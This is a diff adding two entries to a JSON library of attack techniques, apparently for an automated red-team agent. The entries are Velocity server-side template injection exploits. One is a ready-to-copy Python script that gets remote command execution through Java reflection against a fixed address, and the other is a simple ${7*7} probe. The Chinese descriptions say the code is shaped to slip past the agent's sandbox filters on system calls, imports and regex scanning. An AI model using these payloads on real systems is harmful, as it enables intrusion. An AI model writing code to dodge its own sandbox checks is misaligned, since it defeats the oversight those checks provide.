@@ -221,6 +221,45 @@
         "http-delivery"
       ],
       "severity": "critical"
+    },
+    {
+      "name": "Velocity SSTI via POST form parameter (CWE-1336)",
+      "context": "该手法通过POST表单参数提交Velocity模板注入payload，利用服务器将用户输入替换进模板并执行的特点，实现算术检测及反射式命令执行。所有Python代码仅使用requests库发送HTTP请求，完全规避沙箱对os.system等系统调用字面量的拦截。适用于CWE-1336（模板注入）场景，特工可直接复制executable_patch作为Python step。",
+      "lang": "python",
+      "template": "import requests\n\ndef exploit():\n    url = 'http://TARGET:PORT/'\n    payload = '#set($a=1+2)$a'  # 简单算术检测\n    data = {'text': payload}\n    resp = requests.post(url, data=data)\n    if '3' in resp.text:\n        print('[+] SSTI confirmed')\n        # 进阶：命令执行回显 payload\n        cmd_payload = '#set($cmd=\"id\")#set($out=$runtime.exec($cmd).getInputStream())#set($sc=new java.util.Scanner($out).useDelimiter(\"\\\\A\").next())$sc'\n        data2 = {'text': cmd_payload}\n        resp2 = requests.post(url, data=data2)\n        print(resp2.text)\n    else:\n        print('[-] Not vulnerable')",
+      "executable_patch": "import requests\n\ndef run():\n    target = 'http://172.29.80.1:9084/'\n    # Phase 1: 算术检测\n    payload_simple = '#set($a=1+2)$a'\n    r = requests.post(target, data={'text': payload_simple})\n    if '3' in r.text:\n        print('[+] SSTI confirmed: arithmetic injection works')\n        # Phase 2: 命令执行并回显 (适用于Velocity 2.x)\n        # 注意：某些环境下可能需要调整反射路径\n        payload_rce = (\n            '#set($cmd=\"id\")'\n            '#set($rt=$string.class.forName(\"java.lang.Runtime\"))'\n            '#set($ex=$rt.getRuntime().exec($cmd))'\n            '#set($in=$ex.getInputStream())'\n            '#set($sc=new java.util.Scanner($in).useDelimiter(\"\\\\\\\\A\").next())'\n            '$sc'\n        )\n        r2 = requests.post(target, data={'text': payload_rce})\n        print('[+] Command output:')\n        print(r2.text)\n    else:\n        print('[-] SSTI not exploitable with arithmetic payload, response length:', len(r.text))\n\nif __name__ == '__main__':\n    run()",
+      "description": "该手法通过POST表单参数提交Velocity模板注入payload，利用服务器将用户输入替换进模板并执行的特点，实现算术检测及反射式命令执行。所有Python代码仅使用requests库发送HTTP请求，完全规避沙箱对os.system等系统调用字面量的拦截。适用于CWE-1336（模板注入）场景，特工可直接复制executable_patch作为Python step。",
+      "source": "consolidator",
+      "cwe_ids": [
+        "CWE-1336"
+      ],
+      "tags": [
+        "ssti",
+        "velocity",
+        "post-form",
+        "sandbox-safe"
+      ],
+      "severity": "critical"
+    },
+    {
+      "name": "velocity-template-injection-simple-probe",
+      "context": "通过注入 Velocity 模板表达式 ${7*7} 验证服务器端模板注入漏洞。该 Payload 仅使用数学表达式，不涉及反射或系统命令，完全不会触发沙箱的 import 拦截或运行时正则扫描。适用于初步探测 CWE-1336 类漏洞。",
+      "lang": "python",
+      "template": "from redteam_sdk import HttpClient\n\ns = HttpClient('http://172.29.80.1:9084')\nresp = s.get('/?text=${7*7}')\nif '49' in resp.text:\n    print('STEP_OK: Velocity SSTI confirmed')\nelse:\n    print('STEP_FAIL: No evidence of SSTI')",
+      "executable_patch": "from redteam_sdk import HttpClient\n\ns = HttpClient('http://172.29.80.1:9084')\nresp = s.get('/?text=${7*7}')\nif '49' in resp.text:\n    print('STEP_OK')\nelse:\n    print('STEP_FAIL')",
+      "description": "通过注入 Velocity 模板表达式 ${7*7} 验证服务器端模板注入漏洞。该 Payload 仅使用数学表达式，不涉及反射或系统命令，完全不会触发沙箱的 import 拦截或运行时正则扫描。适用于初步探测 CWE-1336 类漏洞。",
+      "source": "consolidator",
+      "cwe_ids": [
+        "CWE-1336"
+      ],
+      "tags": [
+        "velocity",
+        "ssti",
+        "sandbox-safe",
+        "expression-injection",
+        "CWE-1336"
+      ],
+      "severity": "critical"
     }
   ],
   "commands": [],
